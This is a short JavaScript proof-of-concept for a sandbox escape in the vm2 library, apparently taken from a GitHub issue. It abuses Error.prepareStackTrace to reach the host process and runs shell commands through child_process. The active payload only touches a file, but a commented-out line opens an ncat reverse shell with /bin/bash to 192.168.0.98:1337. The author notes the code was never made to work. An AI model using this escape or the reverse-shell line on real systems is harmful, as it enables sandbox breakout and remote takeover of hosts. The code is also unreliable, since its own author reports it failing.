// https://github.com/patriksimek/vm2/issues/467
var poc = function () {
    // This line insert vulnerabilities!
    globalThis.Error.prepareStackTrace = (_, c) =>
        c.map((c) => c.getThis()).find((a) => a && a.process);
    const { stack } = new Error();
    // now you can get process object from stack.process
    console.info(stack.process.mainModule);
    // and you can use process.mainModule.require to import any library to execute any commands
    stack.process.mainModule.require('child_process').execSync('touch tmp/lolololol');
    //stack.process.mainModule.require('child_process').execSync('/bin/ncat 192.168.0.98 1337 -e /bin/bash');
};

// I could never get this poc to work but I included it anyway
poc();